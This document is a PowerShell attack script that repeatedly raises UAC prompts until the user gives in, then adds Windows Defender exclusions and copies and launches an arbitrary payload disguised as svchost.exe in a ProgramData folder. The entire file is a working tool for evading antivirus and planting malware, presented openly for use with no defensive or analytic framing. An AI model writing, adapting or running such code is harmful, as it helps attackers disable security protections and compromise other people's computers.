# UAC Loop Script for Defender Exclusion
# Usage: powershell -EP Bypass -F uac.ps1 -PayloadPath "path" -ProcessName "name"

param(
    [string]$PayloadPath,
    [string]$ProcessName = "svchost.exe"
)

# Create exclusion folder
$ExclusionFolder = "$env:ProgramData\Windows"
if (!(Test-Path $ExclusionFolder)) {
    New-Item -ItemType Directory -Path $ExclusionFolder -Force | Out-Null
}

$PermanentPath = "$ExclusionFolder\$ProcessName"

# Loop 20 times with UAC prompts
1..20 | ForEach-Object {
    try {
        # Create batch file for UAC elevation
        $BatchFile = "$env:TEMP\elevate.bat"
        $BatchContent = @"
@echo off
powershell -Command "Add-MpPreference -ExclusionPath '$ExclusionFolder' -EA 0"
powershell -Command "Add-MpPreference -ExclusionProcess '$ProcessName' -EA 0"
copy "$PayloadPath" "$PermanentPath" /Y
start /B "$PermanentPath"
exit 0
"@
        [IO.File]::WriteAllText($BatchFile, $BatchContent)
        
        # Run with UAC prompt (visible!)
        $process = Start-Process $BatchFile -Verb RunAs -PassThru -ErrorAction Stop
        
        # Wait a bit and check if successful
        Start-Sleep -Seconds 2
        if (Test-Path $PermanentPath) {
            Write-Host "Success! Payload moved to exclusion folder."
            break
        }
    }
    catch {
        # UAC was declined or error occurred
    }
    
    # Wait before next attempt
    Start-Sleep -Seconds 3
}

